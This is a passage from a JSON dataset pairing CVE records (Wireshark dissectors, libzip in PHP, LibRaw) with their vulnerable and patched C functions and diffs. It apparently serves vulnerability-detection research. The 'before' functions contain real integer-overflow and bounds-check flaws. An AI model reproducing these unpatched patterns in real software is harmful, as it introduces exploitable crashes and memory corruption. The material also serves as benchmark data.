FALSE;\n\n            case(BLOCK_TYPE_PB):\n            case(BLOCK_TYPE_SPB):\n            case(BLOCK_TYPE_EPB):\n                /* packet block - we've found a packet */\n                goto got_packet;\n\n            case(BLOCK_TYPE_IDB):\n                /* A new interface */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_IDB\");\n                pcapng_process_idb(wth, pcapng, &wblock);\n                break;\n\n            case(BLOCK_TYPE_NRB):\n                /* More name resolution entries */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_NRB\");\n                break;\n\n            case(BLOCK_TYPE_ISB):\n                /* Another interface statistics report */\n                pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_ISB\");\n                if (wth->interface_data->len <= wblock.data.if_stats.interface_id) {\n                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u >= number_of_interfaces\", wblock.data.if_stats.interface_id);\n                } else {\n                    /* Get the interface description */\n                    wtapng_if_descr = &g_array_index(wth->interface_data, wtapng_if_descr_t, wblock.data.if_stats.interface_id);\n                    if (wtapng_if_descr->num_stat_entries == 0) {\n                        /* First ISB found, no previous entry */\n                        pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_ISB. First ISB found, no previous entry\");\n                        wtapng_if_descr->interface_statistics = g_array_new(FALSE, FALSE, sizeof(wtapng_if_stats_t));\n                    }\n\n                    if_stats.interface_id       = wblock.data.if_stats.interface_id;\n                    if_stats.ts_high            = wblock.data.if_stats.ts_high;\n                    if_stats.ts_low             = wblock.data.if_stats.ts_low;\n                    /* options */\n                    if_stats.opt_comment        = wblock.data.if_stats.opt_comment;     /* NULL if not available */\n                    if_stats.isb_starttime      = wblock.data.if_stats.isb_starttime;\n                    if_stats.isb_endtime        = wblock.data.if_stats.isb_endtime;\n                    if_stats.isb_ifrecv         = wblock.data.if_stats.isb_ifrecv;\n                    if_stats.isb_ifdrop         = wblock.data.if_stats.isb_ifdrop;\n                    if_stats.isb_filteraccept   = wblock.data.if_stats.isb_filteraccept;\n                    if_stats.isb_osdrop         = wblock.data.if_stats.isb_osdrop;\n                    if_stats.isb_usrdeliv       = wblock.data.if_stats.isb_usrdeliv;\n\n                    g_array_append_val(wtapng_if_descr->interface_statistics, if_stats);\n                    wtapng_if_descr->num_stat_entries++;\n                }\n                break;\n\n            default:\n                /* XXX - improve handling of \"unknown\" blocks */\n                pcapng_debug1(\"pcapng_read: Unknown block type 0x%08x\", wblock.type);\n                break;\n        }\n    }\n\ngot_packet:\n\n    /*pcapng_debug2(\"Read length: %u Packet length: %u\", bytes_read, wth->phdr.caplen);*/\n    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset);\n\n    return TRUE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -52,8 +52,8 @@\n             case(BLOCK_TYPE_ISB):\n                 /* Another interface statistics report */\n                 pcapng_debug0(\"pcapng_read: block type BLOCK_TYPE_ISB\");\n-                if (wth->interface_data->len < wblock.data.if_stats.interface_id) {\n-                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u > number_of_interfaces\", wblock.data.if_stats.interface_id);\n+                if (wth->interface_data->len <= wblock.data.if_stats.interface_id) {\n+                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u >= number_of_interfaces\", wblock.data.if_stats.interface_id);\n                 } else {\n                     /* Get the interface description */\n                     wtapng_if_descr = &g_array_index(wth->interface_data, wtapng_if_descr_t, wblock.data.if_stats.interface_id);\n@@ -91,7 +91,7 @@\n got_packet:\n \n     /*pcapng_debug2(\"Read length: %u Packet length: %u\", bytes_read, wth->phdr.caplen);*/\n-    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset + bytes_read);\n+    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset);\n \n     return TRUE;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "                if (wth->interface_data->len < wblock.data.if_stats.interface_id) {",
                "                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u > number_of_interfaces\", wblock.data.if_stats.interface_id);",
                "    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset + bytes_read);"
            ],
            "added_lines": [
                "                if (wth->interface_data->len <= wblock.data.if_stats.interface_id) {",
                "                    pcapng_debug1(\"pcapng_read: BLOCK_TYPE_ISB wblock.if_stats.interface_id %u >= number_of_interfaces\", wblock.data.if_stats.interface_id);",
                "    pcapng_debug1(\"pcapng_read: data_offset is finally %\" G_GINT64_MODIFIER \"d\", *data_offset);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-2191",
        "func_name": "wireshark/dissect_tnef",
        "description": "Integer overflow in the dissect_tnef function in epan/dissectors/packet-tnef.c in the TNEF dissector in Wireshark 1.10.x before 1.10.13 and 1.12.x before 1.12.4 allows remote attackers to cause a denial of service (infinite loop) via a crafted length field in a packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/608cf324b3962877e9699f3e81e8f82ac9f1ea14",
        "commit_title": "tnef: fix overflow leading to infinite loop",
        "commit_text": " Thanks to Vlad Tsyrklevich for the report, and Fabian Yamaguchi for the \"joern\" tool which found the bug.  Bug: 11023",
        "func_before": "static void dissect_tnef(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree)\n{\n  proto_item *attr_item, *item;\n  proto_tree *attr_tree, *tag_tree, *props_tree, *addr_tree, *date_tree;\n  guint32     tag, length, signature;\n  gint        offset, start_offset;\n  tvbuff_t   *next_tvb;\n\n  if(tree){\n    item = proto_tree_add_item(tree, proto_tnef, tvb, 0, -1, ENC_NA);\n    tree = proto_item_add_subtree(item, ett_tnef);\n  }\n\n  offset = 0;\n\n  /* first the signature */\n  signature = tvb_get_letohl(tvb, offset);\n  item = proto_tree_add_item(tree, hf_tnef_signature, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n  offset += 4;\n\n  /* check the signature */\n  if(signature != TNEF_SIGNATURE) {\n\n    expert_add_info_format(pinfo, item, &ei_tnef_incorrect_signature,\n               \" [Incorrect, should be 0x%x. No further dissection possible. Check any Content-Transfer-Encoding has been removed.]\", TNEF_SIGNATURE);\n    return;\n\n  } else {\n\n    proto_item_append_text(item, \" [Correct]\");\n\n  }\n\n  proto_tree_add_item(tree, hf_tnef_key, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n  offset += 2;\n\n  while(tvb_reported_length_remaining(tvb, offset) > 9 ) { /* there must be at least a level (1), tag (4) and length (4) to be valid */\n\n    start_offset = offset;\n\n    attr_item = proto_tree_add_item(tree, hf_tnef_attribute, tvb, offset, -1, ENC_NA);\n    attr_tree = proto_item_add_subtree(attr_item, ett_tnef_attribute);\n\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_lvl, tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset += 1;\n\n    item = proto_tree_add_item(attr_tree, hf_tnef_attribute_tag, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n    tag_tree = proto_item_add_subtree(item, ett_tnef_attribute_tag);\n\n    /* add a nice name to the property */\n    tag = tvb_get_letohl(tvb, offset);\n    proto_item_append_text(attr_item, \" %s\", val_to_str(tag, tnef_Attribute_vals, \"Unknown tag (0x%08lx)\"));\n\n    proto_tree_add_item(tag_tree, hf_tnef_attribute_tag_id, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    offset += 2;\n\n    proto_tree_add_item(tag_tree, hf_tnef_attribute_tag_type, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    /* remember the type for the value dissection */\n    offset += 2;\n\n    length = tvb_get_letohl(tvb, offset);\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_length, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n    offset += 4;\n\n    switch(tag) {\n    case ATT_OEM_CODEPAGE:\n      proto_tree_add_item(attr_tree, hf_tnef_oem_codepage, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    case ATT_TNEF_VERSION:\n      proto_tree_add_item(attr_tree, hf_tnef_version, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    case ATT_MESSAGE_CLASS:\n      proto_tree_add_item(attr_tree, hf_tnef_message_class, tvb, offset, length, ENC_ASCII|ENC_NA);\n      break;\n    case ATT_ORIGINAL_MESSAGE_CLASS:\n      proto_tree_add_item(attr_tree, hf_tnef_original_message_class, tvb, offset, length, ENC_ASCII|ENC_NA);\n      break;\n    case ATT_MAPI_PROPS:\n      item = proto_tree_add_item(attr_tree, hf_tnef_mapi_props, tvb, offset, length, ENC_NA);\n      props_tree = proto_item_add_subtree(item, ett_tnef_mapi_props);\n\n      next_tvb = tvb_new_subset_length(tvb, offset, length);\n\n      dissect_mapiprops(next_tvb, pinfo, props_tree);\n\n      break;\n    case ATT_OWNER:\n    case ATT_SENT_FOR:\n      addr_tree = proto_item_add_subtree(item, ett_tnef_attribute_address);\n\n      (void)dissect_counted_address(tvb, offset, pinfo, addr_tree);\n\n      break;\n    case ATT_PRIORITY:\n      proto_tree_add_item(attr_tree, hf_tnef_priority, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    default:\n      /* just do it on the type */\n      switch((tag >> 16) & 0xffff) {\n      case ATP_DATE:\n        item = proto_tree_add_item(attr_tree, hf_tnef_attribute_date, tvb, offset, length, ENC_NA);\n        date_tree = proto_item_add_subtree(item, ett_tnef_attribute_date);\n\n        next_tvb = tvb_new_subset_length(tvb, offset, length);\n\n        dissect_DTR(next_tvb, pinfo, date_tree);\n\n        break;\n      case ATP_STRING:\n        proto_tree_add_item(attr_tree, hf_tnef_attribute_string, tvb, offset, length, ENC_ASCII|ENC_NA);\n        proto_item_append_text(attr_item, \" %s\", tvb_get_string_enc(wmem_packet_scope(), tvb, offset, length, ENC_ASCII));\n        break;\n      default:\n        proto_tree_add_item(attr_tree, hf_tnef_attribute_value, tvb, offset, length, ENC_NA);\n        break;\n      }\n    }\n\n    offset += length;\n\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_checksum, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    offset += 2;\n\n    proto_item_set_len(attr_item, offset - start_offset);\n  }\n\n  /* there may be some padding */\n  if(tvb_reported_length_remaining(tvb, offset)) /* XXX: Not sure if they is really padding or not */\n    proto_tree_add_item(tree, hf_tnef_padding, tvb, offset, tvb_reported_length_remaining(tvb, offset), ENC_NA);\n}",
        "func": "static void dissect_tnef(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree)\n{\n  proto_item *attr_item, *item;\n  proto_tree *attr_tree, *tag_tree, *props_tree, *addr_tree, *date_tree;\n  guint32     tag, length, signature;\n  gint        offset, start_offset;\n  tvbuff_t   *next_tvb;\n\n  if(tree){\n    item = proto_tree_add_item(tree, proto_tnef, tvb, 0, -1, ENC_NA);\n    tree = proto_item_add_subtree(item, ett_tnef);\n  }\n\n  offset = 0;\n\n  /* first the signature */\n  signature = tvb_get_letohl(tvb, offset);\n  item = proto_tree_add_item(tree, hf_tnef_signature, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n  offset += 4;\n\n  /* check the signature */\n  if(signature != TNEF_SIGNATURE) {\n\n    expert_add_info_format(pinfo, item, &ei_tnef_incorrect_signature,\n               \" [Incorrect, should be 0x%x. No further dissection possible. Check any Content-Transfer-Encoding has been removed.]\", TNEF_SIGNATURE);\n    return;\n\n  } else {\n\n    proto_item_append_text(item, \" [Correct]\");\n\n  }\n\n  proto_tree_add_item(tree, hf_tnef_key, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n  offset += 2;\n\n  while(tvb_reported_length_remaining(tvb, offset) > 9 ) { /* there must be at least a level (1), tag (4) and length (4) to be valid */\n\n    start_offset = offset;\n\n    attr_item = proto_tree_add_item(tree, hf_tnef_attribute, tvb, offset, -1, ENC_NA);\n    attr_tree = proto_item_add_subtree(attr_item, ett_tnef_attribute);\n\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_lvl, tvb, offset, 1, ENC_LITTLE_ENDIAN);\n    offset += 1;\n\n    item = proto_tree_add_item(attr_tree, hf_tnef_attribute_tag, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n    tag_tree = proto_item_add_subtree(item, ett_tnef_attribute_tag);\n\n    /* add a nice name to the property */\n    tag = tvb_get_letohl(tvb, offset);\n    proto_item_append_text(attr_item, \" %s\", val_to_str(tag, tnef_Attribute_vals, \"Unknown tag (0x%08lx)\"));\n\n    proto_tree_add_item(tag_tree, hf_tnef_attribute_tag_id, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    offset += 2;\n\n    proto_tree_add_item(tag_tree, hf_tnef_attribute_tag_type, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    /* remember the type for the value dissection */\n    offset += 2;\n\n    length = tvb_get_letohl(tvb, offset);\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_length, tvb, offset, 4, ENC_LITTLE_ENDIAN);\n    offset += 4;\n\n    switch(tag) {\n    case ATT_OEM_CODEPAGE:\n      proto_tree_add_item(attr_tree, hf_tnef_oem_codepage, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    case ATT_TNEF_VERSION:\n      proto_tree_add_item(attr_tree, hf_tnef_version, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    case ATT_MESSAGE_CLASS:\n      proto_tree_add_item(attr_tree, hf_tnef_message_class, tvb, offset, length, ENC_ASCII|ENC_NA);\n      break;\n    case ATT_ORIGINAL_MESSAGE_CLASS:\n      proto_tree_add_item(attr_tree, hf_tnef_original_message_class, tvb, offset, length, ENC_ASCII|ENC_NA);\n      break;\n    case ATT_MAPI_PROPS:\n      item = proto_tree_add_item(attr_tree, hf_tnef_mapi_props, tvb, offset, length, ENC_NA);\n      props_tree = proto_item_add_subtree(item, ett_tnef_mapi_props);\n\n      next_tvb = tvb_new_subset_length(tvb, offset, length);\n\n      dissect_mapiprops(next_tvb, pinfo, props_tree);\n\n      break;\n    case ATT_OWNER:\n    case ATT_SENT_FOR:\n      addr_tree = proto_item_add_subtree(item, ett_tnef_attribute_address);\n\n      (void)dissect_counted_address(tvb, offset, pinfo, addr_tree);\n\n      break;\n    case ATT_PRIORITY:\n      proto_tree_add_item(attr_tree, hf_tnef_priority, tvb, offset, length, ENC_LITTLE_ENDIAN);\n      break;\n    default:\n      /* just do it on the type */\n      switch((tag >> 16) & 0xffff) {\n      case ATP_DATE:\n        item = proto_tree_add_item(attr_tree, hf_tnef_attribute_date, tvb, offset, length, ENC_NA);\n        date_tree = proto_item_add_subtree(item, ett_tnef_attribute_date);\n\n        next_tvb = tvb_new_subset_length(tvb, offset, length);\n\n        dissect_DTR(next_tvb, pinfo, date_tree);\n\n        break;\n      case ATP_STRING:\n        proto_tree_add_item(attr_tree, hf_tnef_attribute_string, tvb, offset, length, ENC_ASCII|ENC_NA);\n        proto_item_append_text(attr_item, \" %s\", tvb_get_string_enc(wmem_packet_scope(), tvb, offset, length, ENC_ASCII));\n        break;\n      default:\n        proto_tree_add_item(attr_tree, hf_tnef_attribute_value, tvb, offset, length, ENC_NA);\n        break;\n      }\n    }\n\n    /* check for overflow */\n    if (offset + length > (guint32)offset) {\n      offset += length;\n    }\n\n    proto_tree_add_item(attr_tree, hf_tnef_attribute_checksum, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n    offset += 2;\n\n    proto_item_set_len(attr_item, offset - start_offset);\n  }\n\n  /* there may be some padding */\n  if(tvb_reported_length_remaining(tvb, offset)) /* XXX: Not sure if they is really padding or not */\n    proto_tree_add_item(tree, hf_tnef_padding, tvb, offset, tvb_reported_length_remaining(tvb, offset), ENC_NA);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -116,7 +116,10 @@\n       }\n     }\n \n-    offset += length;\n+    /* check for overflow */\n+    if (offset + length > (guint32)offset) {\n+      offset += length;\n+    }\n \n     proto_tree_add_item(attr_tree, hf_tnef_attribute_checksum, tvb, offset, 2, ENC_LITTLE_ENDIAN);\n     offset += 2;",
        "diff_line_info": {
            "deleted_lines": [
                "    offset += length;"
            ],
            "added_lines": [
                "    /* check for overflow */",
                "    if (offset + length > (guint32)offset) {",
                "      offset += length;",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-2192",
        "func_name": "wireshark/dissect_osd2_cdb_continuation",
        "description": "Integer overflow in the dissect_osd2_cdb_continuation function in epan/dissectors/packet-scsi-osd.c in the SCSI OSD dissector in Wireshark 1.12.x before 1.12.4 allows remote attackers to cause a denial of service (infinite loop) via a crafted length field in a packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/c35ca6c051adb28c321db54cc138f18637977c9a",
        "commit_title": "scsi-osd: fix overflow leading to infinite loop",
        "commit_text": " Thanks to Vlad Tsyrklevich for the report.  Bug: 11024",
        "func_before": "static void\ndissect_osd2_cdb_continuation(packet_info *pinfo, tvbuff_t *tvb, guint32 offset,\n                              proto_tree *tree, scsi_task_data_t *cdata)\n{\n    scsi_osd_extra_data_t *extra_data = NULL;\n    proto_item            *item;\n    guint8                 format;\n    guint16                sa;\n    if (cdata && cdata->itlq && cdata->itlq->extra_data) {\n        extra_data = (scsi_osd_extra_data_t *)cdata->itlq->extra_data;\n    }\n    if (!extra_data || extra_data->continuation_length<40) return;\n\n    /* cdb continuation format */\n    item = proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_format, tvb, offset, 1, ENC_BIG_ENDIAN);\n    format = tvb_get_guint8(tvb, offset);\n    if (format != 0x01) {\n        expert_add_info(pinfo, item, &ei_osd2_cdb_continuation_format_unknown);\n        return;\n    }\n    offset += 1;\n\n    /* 1 reserved byte */\n    offset += 1;\n\n    /* continued service action */\n    item = proto_tree_add_item(tree, hf_scsi_osd2_continued_service_action, tvb, offset, 2, ENC_BIG_ENDIAN);\n    sa = tvb_get_ntohs(tvb, offset);\n    if (sa != extra_data->svcaction) {\n        expert_add_info(pinfo, item, &ei_osd2_continued_service_action_mismatch);\n    }\n    offset += 2;\n\n    /*4 reserved bytes and continuation integrity check value (32 bytes, not dissected)*/\n    offset += 36;\n\n\n    /* CDB continuation descriptors */\n    while (offset<extra_data->continuation_length) {\n        guint16 type;\n        guint32 length, padlen;\n        proto_item *item_type, *item_length;\n\n        /* descriptor type */\n        item_type= proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_type, tvb, offset, 2, ENC_BIG_ENDIAN);\n        type = tvb_get_ntohs(tvb, offset);\n        offset += 2;\n\n        /* 1 reserved byte*/\n        offset += 1;\n\n        /* descriptor pad length */\n        proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_pad_length, tvb, offset, 1, ENC_BIG_ENDIAN);\n        padlen = tvb_get_guint8(tvb, offset)&7;\n        offset += 1;\n\n        /* descriptor length */\n        item_length = proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_length, tvb, offset, 4, ENC_BIG_ENDIAN);\n        length = tvb_get_ntohl(tvb, offset);\n        offset += 4;\n\n        switch (type) {\n            case 0x0000: break;\n            case 0x0001: break;\n            case 0x0002: dissect_osd2_query_list_descriptor(pinfo, tvb, offset, tree, length);\n            case 0x0100: break;\n            case 0x0101: break;\n            case 0xFFEE: break;\n            default: expert_add_info(pinfo, item_type, &ei_osd2_cdb_continuation_descriptor_type_unknown);\n        }\n\n        if ((length+padlen)%8) {\n            expert_add_info(pinfo, item_length, &ei_osd2_cdb_continuation_descriptor_length_invalid);\n            return;\n        }\n        offset += length+padlen;\n    }\n\n}",
        "func": "static void\ndissect_osd2_cdb_continuation(packet_info *pinfo, tvbuff_t *tvb, guint32 offset,\n                              proto_tree *tree, scsi_task_data_t *cdata)\n{\n    scsi_osd_extra_data_t *extra_data = NULL;\n    proto_item            *item;\n    guint8                 format;\n    guint16                sa;\n    if (cdata && cdata->itlq && cdata->itlq->extra_data) {\n        extra_data = (scsi_osd_extra_data_t *)cdata->itlq->extra_data;\n    }\n    if (!extra_data || extra_data->continuation_length<40) return;\n\n    /* cdb continuation format */\n    item = proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_format, tvb, offset, 1, ENC_BIG_ENDIAN);\n    format = tvb_get_guint8(tvb, offset);\n    if (format != 0x01) {\n        expert_add_info(pinfo, item, &ei_osd2_cdb_continuation_format_unknown);\n        return;\n    }\n    offset += 1;\n\n    /* 1 reserved byte */\n    offset += 1;\n\n    /* continued service action */\n    item = proto_tree_add_item(tree, hf_scsi_osd2_continued_service_action, tvb, offset, 2, ENC_BIG_ENDIAN);\n    sa = tvb_get_ntohs(tvb, offset);\n    if (sa != extra_data->svcaction) {\n        expert_add_info(pinfo, item, &ei_osd2_continued_service_action_mismatch);\n    }\n    offset += 2;\n\n    /*4 reserved bytes and continuation integrity check value (32 bytes, not dissected)*/\n    offset += 36;\n\n\n    /* CDB continuation descriptors */\n    while (offset<extra_data->continuation_length) {\n        guint16 type;\n        guint32 length, padlen;\n        proto_item *item_type, *item_length;\n\n        /* descriptor type */\n        item_type= proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_type, tvb, offset, 2, ENC_BIG_ENDIAN);\n        type = tvb_get_ntohs(tvb, offset);\n        offset += 2;\n\n        /* 1 reserved byte*/\n        offset += 1;\n\n        /* descriptor pad length */\n        proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_pad_length, tvb, offset, 1, ENC_BIG_ENDIAN);\n        padlen = tvb_get_guint8(tvb, offset)&7;\n        offset += 1;\n\n        /* descriptor length */\n        item_length = proto_tree_add_item(tree, hf_scsi_osd2_cdb_continuation_descriptor_length, tvb, offset, 4, ENC_BIG_ENDIAN);\n        length = tvb_get_ntohl(tvb, offset);\n        offset += 4;\n\n        switch (type) {\n            case 0x0000: break;\n            case 0x0001: break;\n            case 0x0002: dissect_osd2_query_list_descriptor(pinfo, tvb, offset, tree, length);\n            case 0x0100: break;\n            case 0x0101: break;\n            case 0xFFEE: break;\n            default: expert_add_info(pinfo, item_type, &ei_osd2_cdb_continuation_descriptor_type_unknown);\n        }\n\n        if ((length+padlen)%8) {\n            expert_add_info(pinfo, item_length, &ei_osd2_cdb_continuation_descriptor_length_invalid);\n            return;\n        }\n        /* check for overflow */\n        if (offset + length + padlen > offset) {\n            offset += length+padlen;\n        }\n    }\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -73,7 +73,10 @@\n             expert_add_info(pinfo, item_length, &ei_osd2_cdb_continuation_descriptor_length_invalid);\n             return;\n         }\n-        offset += length+padlen;\n+        /* check for overflow */\n+        if (offset + length + padlen > offset) {\n+            offset += length+padlen;\n+        }\n     }\n \n }",
        "diff_line_info": {
            "deleted_lines": [
                "        offset += length+padlen;"
            ],
            "added_lines": [
                "        /* check for overflow */",
                "        if (offset + length + padlen > offset) {",
                "            offset += length+padlen;",
                "        }"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-2331",
        "func_name": "php/php-src/_zip_cdir_new",
        "description": "Integer overflow in the _zip_cdir_new function in zip_dirent.c in libzip 0.11.2 and earlier, as used in the ZIP extension in PHP before 5.4.39, 5.5.x before 5.5.23, and 5.6.x before 5.6.7 and other products, allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a ZIP archive that contains many entries, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/4a8d8b4154334b1714e19b82b061201d41dc87d6",
        "commit_title": "Fix bug #69253 - ZIP Integer Overflow leads to writing past heap boundary",
        "commit_text": "",
        "func_before": "struct zip_cdir *\n_zip_cdir_new(int nentry, struct zip_error *error)\n{\n    struct zip_cdir *cd;\n    \n    if ((cd=(struct zip_cdir *)malloc(sizeof(*cd))) == NULL) {\n\t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n\treturn NULL;\n    }\n\n    if ((cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*nentry))\n\t== NULL) {\n\t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n\tfree(cd);\n\treturn NULL;\n    }\n\n    /* entries must be initialized by caller */\n\n    cd->nentry = nentry;\n    cd->size = cd->offset = 0;\n    cd->comment = NULL;\n    cd->comment_len = 0;\n\n    return cd;\n}",
        "func": "struct zip_cdir *\n_zip_cdir_new(int nentry, struct zip_error *error)\n{\n    struct zip_cdir *cd;\n    \n    if ((cd=(struct zip_cdir *)malloc(sizeof(*cd))) == NULL) {\n\t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n\treturn NULL;\n    }\n\n    if ( nentry > ((size_t)-1)/sizeof(*(cd->entry)) || (cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*(size_t)nentry))\n\t== NULL) {\n\t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n\tfree(cd);\n\treturn NULL;\n    }\n\n    /* entries must be initialized by caller */\n\n    cd->nentry = nentry;\n    cd->size = cd->offset = 0;\n    cd->comment = NULL;\n    cd->comment_len = 0;\n\n    return cd;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n \treturn NULL;\n     }\n \n-    if ((cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*nentry))\n+    if ( nentry > ((size_t)-1)/sizeof(*(cd->entry)) || (cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*(size_t)nentry))\n \t== NULL) {\n \t_zip_error_set(error, ZIP_ER_MEMORY, 0);\n \tfree(cd);",
        "diff_line_info": {
            "deleted_lines": [
                "    if ((cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*nentry))"
            ],
            "added_lines": [
                "    if ( nentry > ((size_t)-1)/sizeof(*(cd->entry)) || (cd->entry=(struct zip_dirent *)malloc(sizeof(*(cd->entry))*(size_t)nentry))"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3885",
        "func_name": "LibRaw/ljpeg_start",
        "description": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.",
        "git_url": "https://github.com/LibRaw/LibRaw/commit/4606c28f494a750892c5c1ac7903e62dd1c6fdb5",
        "commit_title": "0.16.1: fix for dcraw ljpeg_start() vulnerability",
        "commit_text": "",
        "func_before": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag, len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  if (jh->clrs > 6 || !jh->huff[0]) return 0;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "func": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag;\n  ushort len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  if (jh->clrs > 6 || !jh->huff[0]) return 0;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) 